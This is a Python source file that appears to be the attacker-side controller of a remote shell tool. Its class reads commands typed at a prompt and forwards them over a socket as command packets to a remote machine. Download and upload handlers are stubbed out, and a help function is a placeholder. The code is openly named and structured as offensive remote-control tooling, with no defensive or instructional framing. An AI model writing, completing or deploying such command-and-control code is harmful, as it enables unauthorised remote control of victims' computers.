from src.modlues.protocols.protocol import SendPacket
from src.modlues.protocols.remote_shell import RemoteShellPacket, RemoteShellPacketType


class RemoteShellAttackerSide:

    def __init__(self, sock):
        self.sock = sock


    def __help(self, args: list = None):
        print('get some help')


    def __download(self):
        pass

    def __upload(self):
        pass

    def __admin_input(self):
        while True:
            raw_command = input('$ ')

            command_components = raw_command.split(' ')
            command = command_components[0]
            command_args = command_components[1:]

            if command in RemoteShellAttackerSide.commands.keys():
                RemoteShellAttackerSide.commands[command](self, command_args)
            else:
                packet = RemoteShellPacket(RemoteShellPacketType.COMMAND, raw_command.encode())
                SendPacket.send_packet(self.sock, packet)


    commands = {
        "download": __download,
        "upload": __upload,
    }

